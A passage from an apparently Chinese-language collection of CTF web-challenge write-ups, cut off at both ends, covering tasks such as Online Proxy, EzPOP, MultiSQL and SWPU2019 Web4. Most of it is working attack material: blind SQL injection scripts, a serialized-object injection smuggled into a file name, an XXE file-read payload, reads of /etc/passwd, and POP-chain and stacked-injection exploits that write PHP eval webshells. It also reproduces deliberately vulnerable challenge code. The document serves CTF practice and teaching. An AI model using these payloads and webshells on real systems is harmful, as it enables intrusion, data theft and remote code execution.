upload($input=\"file\")\n\t{\n\t\t$fileinfo = $this->getfile($input);\n\t\t$array = array();\n\t\t$array[\"title\"] = $fileinfo['title'];\n\t\t$array[\"filename\"] = $fileinfo['filename'];\n\t\t$array[\"ext\"] = $fileinfo['ext'];\n\t\t$array[\"path\"] = $fileinfo['path'];\n\t\t$img_ext = getimagesize($_FILES[$input][\"tmp_name\"]);\n\t\t$my_ext = array(\"width\"=>$img_ext[0],\"height\"=>$img_ext[1]);\n\t\t$array[\"attr\"] = serialize($my_ext);\n\t\t$id = $this->save($array);\n\t\tif ($id == 0){\n\t\t\tdie(\"Something wrong!\");\n\t\t}\n\t\techo \"<br>\";\n\t\techo \"<p>Your images is uploaded successfully. And your image's id is $id.</p>\";\n\t}\n\n\tpublic function getfile($input)\n\t{\n\t\tif(isset($input)){\n\t\t\t$rs = $this->check($_FILES[$input]);\n\t\t}\n\t\treturn $rs;\n\t}\n\n\tpublic function check($info)\n\t{\n\t\t$basename = substr(md5(time().uniqid()),9,16);\n\t\t$filename = $info[\"name\"];\n\t\t$ext = substr(strrchr($filename, '.'), 1);\n\t\t$cate_exts = array(\"jpg\",\"gif\",\"png\",\"jpeg\");\n\t\tif(!in_array($ext,$cate_exts)){\n\t\t\tdie(\"<p>Please upload the correct image file!!!</p>\");\n\t\t}\n\t    $title = str_replace(\".\".$ext,'',$filename);\n\t    return array('title'=>$title,'filename'=>$basename.\".\".$ext,'ext'=>$ext,'path'=>$this->folder.$basename.\".\".$ext);\n\t}\n\n\tpublic function save($data)\n\t{\n\t\tif(!$data || !is_array($data)){\n\t\t\tdie(\"Something wrong!\");\n\t\t}\n\t\t$id = $this->insert_array($data);\n\t\treturn $id;\n\t}\n\n\tpublic function insert_array($data)\n\t{\t\n\t\t$con = mysqli_connect(\"127.0.0.1\",\"r00t\",\"r00t\",\"pic_base\");\n\t\tif (mysqli_connect_errno($con)) \n\t\t{ \n\t\t    die(\"Connect MySQL Fail:\".mysqli_connect_error());\n\t\t}\n\t\t$sql_fields = array();\n\t\t$sql_val = array();\n\t\tforeach($data as $key=>$value){\n\t\t\t$key_temp = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $key);\n\t\t\t$value_temp = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $value);\n\t\t\t$sql_fields[] = \"`\".$key_temp.\"`\";\n\t\t\t$sql_val[] = \"'\".$value_temp.\"'\";\n\t\t}\n\t\t$sql = \"INSERT INTO images (\".(implode(\",\",$sql_fields)).\") VALUES(\".(implode(\",\",$sql_val)).\")\";\n\t\tmysqli_query($con, $sql);\n\t\t$id = mysqli_insert_id($con);\n\t\tmysqli_close($con);\n\t\treturn $id;\n\t}\n\n\tpublic function view_files($path){\n\t\tif ($this->ifview == False){\n\t\t\treturn False;\n\t\t\t//The function is not yet perfect, it is not open yet.\n\t\t}\n\t\t$content = file_get_contents($path);\n\t\techo $content;\n\t}\n\n\tfunction __destruct(){\n\t\t# Read some config html\n\t\t$this->view_files($this->config);\n\t}\n}\n\n?>\n```\n\n```php\n//upload.php\ninclude(\"./helper.php\");\nclass upload extends helper {\n\tpublic function upload_base(){\n\t\t$this->upload();\n\t}\n}\n\nif ($_FILES){\n\tif ($_FILES[\"file\"][\"error\"]){\n\t\tdie(\"Upload file failed.\");\n\t}else{\n\t\t$file = new upload();\n\t\t$file->upload_base();\n\t}\n}\n\n$a = new helper();\n```\n\n```php\n//show.php\ninclude(\"./helper.php\");\n$show = new show();\nif($_GET[\"delete_all\"]){\n\tif($_GET[\"delete_all\"] == \"true\"){\n\t\t$show->Delete_All_Images();\n\t}\n}\n$show->Get_All_Images();\n\nclass show{\n\tpublic $con;\n\n\tpublic function __construct(){\n\t\t$this->con = mysqli_connect(\"127.0.0.1\",\"r00t\",\"r00t\",\"pic_base\");\n\t\tif (mysqli_connect_errno($this->con)){ \n   \t\t\tdie(\"Connect MySQL Fail:\".mysqli_connect_error());\n\t\t}\n\t}\n\n\tpublic function Get_All_Images(){\n\t\t$sql = \"SELECT * FROM images\";\n\t\t$result = mysqli_query($this->con, $sql);\n\t\tif ($result->num_rows > 0){\n\t\t    while($row = $result->fetch_assoc()){\n\t\t    \tif($row[\"attr\"]){\n\t\t    \t\t$attr_temp = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $row[\"attr\"]);\n\t\t\t\t\t$attr = unserialize($attr_temp);\n\t\t\t\t}\n\t\t        echo \"<p>id=\".$row[\"id\"].\" filename=\".$row[\"filename\"].\" path=\".$row[\"path\"].\"</p>\";\n\t\t    }\n\t\t}else{\n\t\t    echo \"<p>You have not uploaded an image yet.</p>\";\n\t\t}\n\t\tmysqli_close($this->con);\n\t}\n\n\tpublic function Delete_All_Images(){\n\t\t$sql = \"DELETE FROM images\";\n\t\t$result = mysqli_query($this->con, $sql);\n\t}\n}\n?>\n```\n\n找到可供利用的方法\n\n```php\n\tpublic function view_files($path){\n\t\tif ($this->ifview == False){\n\t\t\treturn False;\n\t\t\t//The function is not yet perfect, it is not open yet.\n\t\t}\n\t\t$content = file_get_contents($path);\n\t\techo $content;\n\t}\n```\n\n反序列化的方法\n\n```php\n\tpublic function Get_All_Images(){\n\t\t$sql = \"SELECT * FROM images\";\n\t\t$result = mysqli_query($this->con, $sql);\n\t\tif ($result->num_rows > 0){\n\t\t    while($row = $result->fetch_assoc()){\n\t\t    \tif($row[\"attr\"]){\n\t\t    \t\t$attr_temp = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $row[\"attr\"]);\n\t\t\t\t\t$attr = unserialize($attr_temp);\n\t\t\t\t}\n\t\t        echo \"<p>id=\".$row[\"id\"].\" filename=\".$row[\"filename\"].\" path=\".$row[\"path\"].\"</p>\";\n\t\t    }\n\t\t}\n```\n\n序列化的方法\n\n```php\n\tpublic function upload($input=\"file\")\n\t{\n\t\t$fileinfo = $this->getfile($input);\n\t\t$array = array();\n\t\t$array[\"title\"] = $fileinfo['title'];\n\t\t$array[\"filename\"] = $fileinfo['filename'];\n\t\t$array[\"ext\"] = $fileinfo['ext'];\n\t\t$array[\"path\"] = $fileinfo['path'];\n\t\t$img_ext = getimagesize($_FILES[$input][\"tmp_name\"]);\n\t\t$my_ext = array(\"width\"=>$img_ext[0],\"height\"=>$img_ext[1]);\n\t\t$array[\"attr\"] = serialize($my_ext);\n\t\t$id = $this->save($array);\n\t\tif ($id == 0){\n\t\t\tdie(\"Something wrong!\");\n\t\t}\n\t\techo \"<br>\";\n\t\techo \"<p>Your images is uploaded successfully. And your image's id is $id.</p>\";\n\t}\n```\n\n首先构造helper类\n\n```php\n<?php\nclass helper\n{\n    protected $ifview=true;\n    protected $config=\"/flag\";\n}\n$a = new helper();\necho serialize($a);\necho bin2hex(serialize($a));\n?>\n//O:6:\"helper\":2:{s:9:\"\u0000*\u0000ifview\";b:1;s:9:\"\u0000*\u0000config\";s:5:\"/flag\";}\n```\n\n题目中会将序列化后的\\0*\\0转为\\0\\0\\0再存入数据库并且在取出是逆向使用，其实对于我们的注入没有任何影响\n\n然后查看sql语句构造方法`$sql = \"INSERT INTO images (\".(implode(\",\",$sql_fields)).\") VALUES(\".(implode(\",\",$sql_val)).\")\";`在该方法中，我们可以使用#截断来注释掉后面内容，在文件名处构造payload进行sql注入，而\\0字符不显示，使用16进制编码来将字符串注入\n\n```\npayload：\n文件名：\n1','1','1','1',0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#.jpg\n```\n\n## [极客大挑战 2020]Roamphp1-Welcome\n\n405换POST，`roam1[]=1&roam2[]=2`\n\n## [RoarCTF 2019]Online Proxy\n\n看源码，发现注释中存在我们的信息，存在Last IP，应该是被写入了数据库，尝试在X-Forward-For处构造payload，确实存在，使用`1' or '1`进行测试，发现返回的Last IP变成了1，说明存在SQL注入，构造语句\n\n```\n0' or if() or '0\n```\n\n这样在结果正确时就会返回1\n\n语句的执行顺序是\n\n1、读取IP，并且回显到Current IP位置\n\n2、传入任意不同IP，此时Last IP中的语句被写入数据库\n\n3、传入第二次访问的IP，此时由于与上次访问IP相同，会从数据库中取出注入的语句并且执行回显，完成注入\n\n构造~~偷~~脚本\n\n```python\n# coding:utf-8 \nimport requests\nimport time\nurl = 'http://node3.buuoj.cn:25869/'\n\nres = ''\nfor i in range(1,200):\n    print(i)\n    left = 31\n    right = 127\n    mid = left + ((right - left)>>1)\n    while left < right:\n        #payload = \"0' or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))>{}) or '0\".format(i,mid)\n        #payload  = \"0' or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = 'F4l9_D4t4B45e'),{},1))>{}) or '0\".format(i,mid)\n        #payload  = \"0' or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 'F4l9_t4b1e'),{},1))>{}) or '0\".format(i,mid)\n        payload = \"0' or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{},1))>{}) or '0\".format(i,mid)\n        headers = {\n                    'Cookie': 'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3',\n                    'X-Forwarded-For': payload\n                    }\n        r = requests.post(url = url, headers = headers)\n\n        payload = '111'\n        headers = {\n                    'Cookie': 'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3',\n                    'X-Forwarded-For': payload\n                    }\n        r = requests.post(url = url, headers = headers)\n\n        payload = '111'\n        headers = {\n                    'Cookie': 'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3',\n                    'X-Forwarded-For': payload\n                    } \n        r = requests.post(url = url, headers = headers)\n\n\n        if r.status_code == 429:\n            print('too fast')\n            time.sleep(2)\n        if 'Last Ip: 1'  in r.text:\n            left = mid + 1\n        elif 'Last Ip: 1' not in r.text:\n            right = mid \n        mid = left + ((right-left)>>1)\n    if mid == 31 or mid == 127:\n        break\n    res += chr(mid)\n    print(str(mid),res)\n    time.sleep(1)\n#information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e\n#F4l9_t4b1e\n#F4l9_C01uMn\n```\n\n## [HarekazeCTF2019]Avatar Uploader 1\n\n传图片马不通过估计是因为`getimagesize`没有拿到大小信息，自己搞一个就行，上传发现啥也没得，就换了个头像，看源码咯\n\n```php\n<?php\nerror_reporting(0);\n\nrequire_once('config.php');\nrequire_once('lib/util.php');\nrequire_once('lib/session.php');\n\n$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);\n\n// check whether file is uploaded\nif (!file_exists($_FILES['file']['tmp_name']) || !is_uploaded_file($_FILES['file']['tmp_name'])) {\n  error('No file was uploaded.');\n}\n\n// check file size\nif ($_FILES['file']['size'] > 256000) {\n  error('Uploaded file is too large.');\n}\n\n// check file type\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\n$type = finfo_file($finfo, $_FILES['file']['tmp_name']);\nfinfo_close($finfo);\nif (!in_array($type, ['image/png'])) {\n  error('Uploaded file is not PNG format.');\n}\n\n// check file width/height\n$size = getimagesize($_FILES['file']['tmp_name']);\nif ($size[0] > 256 || $size[1] > 256) {\n  error('Uploaded image is too large.');\n}\nif ($size[2] !== IMAGETYPE_PNG) {\n  // I hope this never happens...\n  error('What happened...? OK, the flag for part 1 is: <code>' . getenv('FLAG1') . '</code>');\n}\n\n// ok\n$filename = bin2hex(random_bytes(4)) . '.png';\nmove_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_DIR . '/' . $filename);\n\n$session->set('avatar', $filename);\nflash('info', 'Your avatar has been successfully updated!');\nredirect('/');\n```\n\n可以看到`if ($size[2] !== IMAGETYPE_PNG)`成立的话就会输出flag\n\ngetimagesize返回结果说明\n\n- 索引 0 给出的是图像宽度的像素值\n- 索引 1 给出的是图像高度的像素值\n- 索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM\n- 索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签\n- 索引 bits 给出的是图像的每种颜色的位数，二进制格式\n- 索引 channels 给出的是图像的通道值，RGB 图像默认是 3\n- 索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(\"Content-type: image/jpeg\");\n\n所以我们现在需要的条件是：\n\n1、文件经过`finfo_file`方法检测到的是PNG图片\n\n2、getimagesize函数返回图片信息，第三个元素不能等于IMAGETYPE_PNG，也就是不能为3\n\n`finfo_file`方法是通过检测文件头的十六进制信息来判断文件类型的，那么我们一点点删除直到`finfo_file`能读出类型而`getimagesize`读不出内容即可\n\n## [CISCN2019 华东南赛区]Web4\n\nRead Something，传参读文件试试`/etc/passwd`读到了，那再读读环境文件吧`/proc/self/environ`，看到python文件位置，读源码\n\n```python\n# encoding:utf-8\nimport re, random, uuid, urllib\nfrom flask import Flask, session, request\n\napp = Flask(__name__)\nrandom.seed(uuid.getnode())\napp.config['SECRET_KEY'] = str(random.random()*233)\napp.debug = True\n\n@app.route('/')\ndef index():\n    session['username'] = 'www-data'\n    return 'Hello World! <a href=\"/read?url=https://baidu.com\">Read somethings</a>'\n\n@app.route('/read')\ndef read():\n    try:\n        url = request.args.get('url')\n        m = re.findall('^file.*', url, re.IGNORECASE)\n        n = re.findall('flag', url, re.IGNORECASE)\n        if m or n:\n            return 'No Hack'\n        res = urllib.urlopen(url)\n        return res.read()\n    except Exception as ex:\n        print str(ex)\n    return 'no response'\n\n@app.route('/flag')\ndef flag():\n    if session and session['username'] == 'fuck':\n        return open('/flag.txt').read()\n    else:\n        return 'Access denied'\n\nif __name__=='__main__':\n    app.run(\n        debug=True,\n        host=\"0.0.0.0\"\n    )\n\n```\n\n可以看到如果想拿到flag，就要在session处构造username为fuck，再看`SECRET_KEY`处\n\n`random.seed(uuid.getnode())`这里的getnode用于获取网络接口的mac地址，如果机器有多个mac地址，则返回通用管理的mac地址\n\n`str(random.random()*233)`此处的随机数由于之前播撒了种子，所以生成的是伪随机数\n\n所以要先读一下环境的网卡地址`/sys/class/net/eth0/address`，然后用脚本得到SECRET_KEY\n\n```python\nrandom.seed(0xae3fa6c532bd)\nrandStr = str(random.random()*233)\nprint(randStr)\n```\n\n伪造session\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205281141102.png)\n\n上传发现不行，寄了以后再来填坑\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## [BSidesCF 2019]SVGMagic\n\n冷知识：SVG格式是由xml语法定义的\n\n关于SVG上传造成的漏洞可以看[这里](https://zhuanlan.zhihu.com/p/323315064)\n\n所以自然联想到XXE漏洞\n\n构造payload\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE note [\n<!ENTITY file SYSTEM \"file:///proc/self/pwd/flag.txt\">\n]>\n<svg height=\"100\" width=\"1000\">\n  <text x=\"10\" y=\"20\">&file;</text>\n</svg>\n```\n\n上传拿flag~~环境似乎有问题，不管怎么传都会报错~~\n\n## [N1CTF 2018]eating_cms\n\n扫出注册界面，注册登录，发现参数传递，尝试使用伪协议读取文件成功\n\n```php\n//user.php\n<?php\nrequire_once(\"function.php\");\nif( !isset( $_SESSION['user'] )){\n    Header(\"Location: index.php\");\n\n}\nif($_SESSION['isadmin'] === '1'){\n    $oper_you_can_do = $OPERATE_admin;\n}else{\n    $oper_you_can_do = $OPERATE;\n}\n//die($_SESSION['isadmin']);\nif($_SESSION['isadmin'] === '1'){\n    if(!isset($_GET['page']) || $_GET['page'] === ''){\n        $page = 'info';\n    }else {\n        $page = $_GET['page'];\n    }\n}\nelse{\n    if(!isset($_GET['page'])|| $_GET['page'] === ''){\n        $page = 'guest';\n    }else {\n        $page = $_GET['page'];\n        if($page === 'info')\n        {\n//            echo(\"<script>alert('no premission to visit info, only admin can, you are guest')</script>\");\n            Header(\"Location: user.php?page=guest\");\n        }\n    }\n}\nfilter_directory();\n//if(!in_array($page,$oper_you_can_do)){\n//    $page = 'info';\n//}\ninclude \"$page.php\";\n?>\n```\n\n```php\n//function.php\n<?php\nsession_start();\nrequire_once \"config.php\";\nfunction Hacker()\n{\n    Header(\"Location: hacker.php\");\n    die();\n}\n\nfunction filter_directory()\n{\n    $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\"];\n    $uri = parse_url($_SERVER[\"REQUEST_URI\"]);\n    parse_str($uri['query'], $query);\n//    var_dump($query);\n//    die();\n    foreach($keywords as $token)\n    {\n        foreach($query as $k => $v)\n        {\n            if (stristr($k, $token))\n                hacker();\n            if (stristr($v, $token))\n                hacker();\n        }\n    }\n}\n\nfunction filter_directory_guest()\n{\n    $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\",\"info\"];\n    $uri = parse_url($_SERVER[\"REQUEST_URI\"]);\n    parse_str($uri['query'], $query);\n//    var_dump($query);\n//    die();\n    foreach($keywords as $token)\n    {\n        foreach($query as $k => $v)\n        {\n            if (stristr($k, $token))\n                hacker();\n            if (stristr($v, $token))\n                hacker();\n        }\n    }\n}\n\nfunction Filter($string)\n{\n    global $mysqli;\n    $blacklist = \"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password\";\n    $whitelist = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+><\";\n    for ($i = 0; $i < strlen($string); $i++) {\n        if (strpos(\"$whitelist\", $string[$i]) === false) {\n            Hacker();\n        }\n    }\n    if (preg_match(\"/$blacklist/is\", $string)) {\n        Hacker();\n    }\n    if (is_string($string)) {\n        return $mysqli->real_escape_string($string);\n    } else {\n        return \"\";\n    }\n}\n\nfunction sql_query($sql_query)\n{\n    global $mysqli;\n    $res = $mysqli->query($sql_query);\n    return $res;\n}\n\nfunction login($user, $pass)\n{\n    $user = Filter($user);\n    $pass = md5($pass);\n    $sql = \"select * from `albert_users` where `username_which_you_do_not_know`= '$user' and `password_which_you_do_not_know_too` = '$pass'\";\n    echo $sql;\n    $res = sql_query($sql);\n//    var_dump($res);\n//    die();\n    if ($res->num_rows) {\n        $data = $res->fetch_array();\n        $_SESSION['user'] = $data[username_which_you_do_not_know];\n        $_SESSION['login'] = 1;\n        $_SESSION['isadmin'] = $data[isadmin_which_you_do_not_know_too_too];\n        return true;\n    } else {\n        return false;\n    }\n    return;\n}\n\nfunction updateadmin($level,$user)\n{\n    $sql = \"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '$level' where `username_which_you_do_not_know`='$user' \";\n    echo $sql;\n    $res = sql_query($sql);\n//    var_dump($res);\n//    die();\n//    die($res);\n    if ($res == 1) {\n        return true;\n    } else {\n        return false;\n    }\n    return;\n}\n\nfunction register($user, $pass)\n{\n    global $mysqli;\n    $user = Filter($user);\n    $pass = md5($pass);\n    $sql = \"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('$user','$pass','0')\";\n    $res = sql_query($sql);\n    return $mysqli->insert_id;\n}\n\nfunction logout()\n{\n    session_destroy();\n    Header(\"Location: index.php\");\n}\n\n?>\n```\n\n查看ffffllllaaaaggg，发现被过滤了\n`/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg`\n但是parse_url解析漏洞，当url种出现下面这种情况的url，会解析错误，返回false\n`//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg`\n读取到这个文件了\n\n```\n<?php\nif (FLAG_SIG != 1){\n    die(\"you can not visit it directly\");\n}else {\n    echo \"you can find sth in m4aaannngggeee\";\n}\n?>\n```\n\n继续查看m4aaannngggeee\n\n```\n<?php\nif (FLAG_SIG != 1){\n    die(\"you can not visit it directly\");\n}\ninclude \"templates/upload.html\";\n\n?>\n```\n\n去看看upload.html，再转回upllloadddd.php\n\n```php\n//upllloadddd.php\n<?php\n$newfile = $path.$filename;\necho \"file upload success<br />\";\necho $filename;\n$picdata = system(\"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\".$filename.\" | base64 -w 0\");\necho \"<img src='data:image/png;base64,\".$picdata.\"'></img>\";\n?>\n\n```\n\n在这没有任何过滤，直接修改文件名就能执行系统命令\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011611789.png)\n\n## [FireshellCTF2020]Caas\n\n试了试php和python代码，都编译失败，各种编程语言都尝试一下发现是C的编译器，你好世界试试\n\n```C\n#include <stdio.h>\nint main() {\n    printf(\"Hello, World! \\n\");\n    return 0;\n}\n```\n\n看wp知道是头文件包含报错，试试/etc/passwd，有回显\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011632778.png)\n\n直接包含flag拿到\n\n## October 2019 Twice SQL Injection\n\n题目名字很明显了，二次注入，注入点在username处\n\n```\nkkk' union select database() #\n\nrua' union select group_concat(table_name) from information_schema.tables where table_schema='ctftraining' #\n\nkkk' union select group_concat(column_name) from information_schema.columns where table_name='flag'#\n\nkkk' union select flag from flag #\n```\n\n做完可以看看源码语句被构造成了什么样\n\n```php\n插入\nif (isset($_POST['username']) && $_POST['username'] != \"\") {\n\t$username = addslashes($_POST['username']);\n\t$password = md5($_POST['password']);\n\tif (mysql_query(\"insert into users(username,password,info) values ('{$username}','{$password}','十月太懒，没有简介');\")) {\n\t\t\theader(\"Location: /?action=login\");\n}\n取出\n$info = query(\"select info from users where username='{$_SESSION['username']}';\");\n```\n\n可以看到从数据库中取出info数据的时候并没有对username进行addslash处理，会导致查询的是kkk这个用户的信息，但是我们并没有注册过这个用户，导致后面的union select执行，产生了二次注入漏洞\n\n## [EIS 2019]EzPOP\n\n上来就给了源码，不错~~不错个毛线啊md这什么玩意啊！！！！！！！！！~~\n\n```php\n<?php\nerror_reporting(0);\n\nclass A {\n    protected $store;\n    protected $key;\n    protected $expire;\n    public function __construct($store, $key = 'flysystem', $expire = null) {\n        $this->key = $key;\n        $this->store = $store;\n        $this->expire = $expire;\n    }\n    public function cleanContents(array $contents) {\n        $cachedProperties = array_flip([\n            'path', 'dirname', 'basename', 'extension', 'filename',\n            'size', 'mimetype', 'visibility', 'timestamp', 'type',\n        ]);//这个函数反转数组中所有的键以及它们关联的值，原来是1->path，现在是path->1\n        foreach ($contents as $path => $object) {\n            if (is_array($object)) {\n                $contents[$path] = array_intersect_key($object, $cachedProperties);//此处比较两个数组的键名，并返回交集\n            }\n        }\n        return $contents;\n    }\n    public function getForStorage() {\n        $cleaned = $this->cleanContents($this->cache);//传入了cache变量，而我们这里发现并没有cache这个变量，所以这个需要后续把变量定义传值\n        return json_encode([$cleaned, $this->complete]);//看到返回值被json_encode\n    }\n    public function save() {\n        $contents = $this->getForStorage();、\n        $this->store->set($this->key, $contents, $this->expire);//这里set函数在B类中存在，到后面再审计\n    }\n    public function __destruct() {//明显这里就是反序列化头了\n        if (!$this->autosave) {\n            $this->save();\n        }\n    }\n}\nclass B {\n    protected function getExpireTime($expire): int {//这边返回的是int参数\n        return (int) $expire;\n    }\n    public function getCacheKey(string $name): string {//拼接字符串\n        return $this->options['prefix'] . $name;\n    }\n    protected function serialize($data): string {//反正就是把所有内容经过options['serialize']名称函数转换了\n        if (is_numeric($data)) {\n            return (string) $data;\n        }\n        $serialize = $this->options['serialize'];\n        return $serialize($data);\n    }\n    public function set($name, $value, $expire = null): bool{\n        $this->writeTimes++;\n        if (is_null($expire)) {//这边$expire可控，直接非null\n            $expire = $this->options['expire'];\n        }\n        $expire = $this->getExpireTime($expire);//转int类型\n        $filename = $this->getCacheKey($name);//这里会把内容变成$this->options['prefix'].$name\n        $dir = dirname($filename);//把如/var/www/html/index.php的字符串转为/var/www/html这样\n        if (!is_dir($dir)) {\n            try {\n                mkdir($dir, 0755, true);\n            } catch (\\Exception $e) {\n                // 创建失败\n            }\n        }\n        $data = $this->serialize($value);//把传入的$value转为字符串\n        if ($this->options['data_compress'] && function_exists('gzcompress')) {\n            //数据压缩，直接options['data_compress']=0绕过\n            $data = gzcompress($data, 3);\n        }\n        $data = \"<?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?>\\n\" . $data;//这里需要绕过死亡exit\n        $result = file_put_contents($filename, $data);//这很明显写shell了\n        if ($result) {\n            return true;\n        }\n        return false;\n    }\n}\n\nif (isset($_GET['src']))\n{\n    highlight_file(__FILE__);\n}\n\n$dir = \"uploads/\";\n\nif (!is_dir($dir))\n{\n    mkdir($dir);\n}\nunserialize($_GET[\"data\"]);\n```\n\n写一下绕过死亡exit的方法，使用base64解码`<?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?>\\n`这个字符串中真正会被base64解码识别到的内容实际上是`php12位长度的数字exit`而base64又是以4个字节为一组来进行解码的，所以我们data中的内容就是随便一个单字符加上一句话木马base64编码后的内容即可\n\n最终构造出的链子就是触发A类销毁引导B类set函数执行\n\n```php\n//exp.php\n<?php\nerror_reporting(0);\n\nclass A {\n    protected $store;\n    protected $key;//文件的name\n    protected $expire;//无所谓其实\n    public function __construct()\n    {\n        $this->cache = array();\n        $this->complete = base64_encode(\"xxx\".base64_encode('<?php @eval($_POST[\"kkk\"]);?>'));\n        $this->key = \"shell.php\";\n        $this->store = new B();\n        $this->autosave = false;\n        $this->expire = 0;\n    }\n}\nclass B {\n    public $options = array();\n    function __construct()\n    {\n        $this->options['serialize'] = 'base64_decode';\n        $this->options['prefix'] = 'php://filter/write=convert.base64-decode/resource=';\n        $this->options['data_compress'] = false;\n    }\n}\nprint(urlencode(serialize(new A)));\n```\n\n## [WMCTF2020]Make PHP Great Again\n\nPHP最新版的小Trick， require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含\n\n## [极客大挑战 2020]Greatphp\n\n先扔一个exp\n\n```\n<?php\nerror_reporting(0);\nclass SYCLOVER {\n    public $syc;\n    public $lover;\n\n}\n\n$str = \"?><?=include~\".urldecode(\"%d0%99%93%9e%98\").\"?>\";\n$a=new Error($str,1);$b=new Error($str,2);\n$c = new SYCLOVER();\n$c->syc = $a;\n$c->lover = $b;\necho urlencode(serialize($c));\n?>\n\n```\n\n\n\n\n\n\n\n\n\n\n\n## [SUCTF 2018]MultiSQL\n\n注册登录，在头像处似乎有文件上传\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206020934705.png)\n\n上传后发现任何文件都被重命名为jpg格式\n\n用户信息处有sql注入点，可使用堆叠注入\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206020935563.png)\n\n过滤了大量关键字，用设定语句变量绕过\n\n```\nstr=\"select '<?php eval($_POST[kkk]);?>' into outfile '/var/www/html/favicon/shell.php';\"\nlen_str=len(str)\nfor i in range(0,len_str):\n\tif i == 0:\n\t\tprint('char(%s'%ord(str[i]),end=\"\")\n\telse:\n\t\tprint(',%s'%ord(str[i]),end=\"\")\nprint(')')\n```\n\n构造写shell payload如下\n\n```\n2;set @a=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,107,107,107,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @a;execute query;\n```\n\nRCE拿flag\n\n## [SWPU2019]Web4\n\nSQL注入，在username处放入单引号报错，但是再加上;就能执行，说明存在堆叠注入，先构造写shell语句发现无法写入，所以构造布尔注入语句\n\n```python\nimport requests, time\nimport json\n\n\ndef str_to_hex(strings):\n    by = bytes(strings, 'UTF-8')  # 先将输入的字符串转化成字节码\n    hexstring = by.hex()\n    return hexstring\nurl = \"http://b28f3ae7-5844-4587-9d21-69687f9fc61d.node4.buuoj.cn:81/index.php?r=Login/Login\"\nflag = \"\"\nfor i in range(1, 100):\n    low = 32\n    high = 128\n    mid = (low + high) // 2\n    while low < high:\n        payload = \"select if(ascii(substr((select flag from flag),{},1))>{},sleep(2),0)\".format(i, mid)\n        zpayload = \"1';set @a=0x{};prepare b from @a;execute b;\".format(str_to_hex(payload))\n        data = {\n            'username': zpayload,\n            'password': '111'\n        }\n        datas = json.dumps(data)\n        time1 = time.time()\n        r = requests.post(url, data=datas)\n        time2 = time.time()\n        times = time2 - time1\n        if times > 2:\n            low = mid + 1\n        else:\n            high = mid\n        mid = (low + high) // 2\n        print(low, mid, high, times)\n    flag += chr(mid)\n    print(flag)\n    if mid == 32:\n        break\n```\n\n跑出一个文件名，下载查看\n\n```php\n///Common/fun.php\n// 路由控制跳转至控制器\nif(!empty($_REQUEST['r']))\n{\n\t$r = explode('/', $_REQUEST['r']);\n\tlist($controller,$action) = $r;\n\t$controller = \"{$controller}Controller\";\n\t$action = \"action{$action}\";\n\tif(class_exists($controller))\n\t{\n\t\tif(method_exists($controller,$action))\n\t\t{\n\t\t\t//\n\t\t}\n\t\telse\n\t\t{\n\t\t\t$action = \"actionIndex\";\n\t\t}\n\t}\n\telse\n\t{\n\t\t$controller = \"LoginController\";\n        $action = \"actionIndex\";\n\t}\n    $data = call_user_func(array( (new $controller), $action));\n} else {\n    header(\"Location:index.php?r=Login/Index\");\n}\n\n```\n\n```php\n/Controller/BaseController\n<?php \n//所有控制器的父类\nclass BaseController\n{\n\t/*\n\t * 加载视图文件\n\t * viewName 视图名称\n\t * viewData 视图分配数据\n\t*/\n\tprivate $viewPath;\n\tpublic function loadView($viewName ='', $viewData = [])\n\t{\n\t\t$this->viewPath = BASE_PATH . 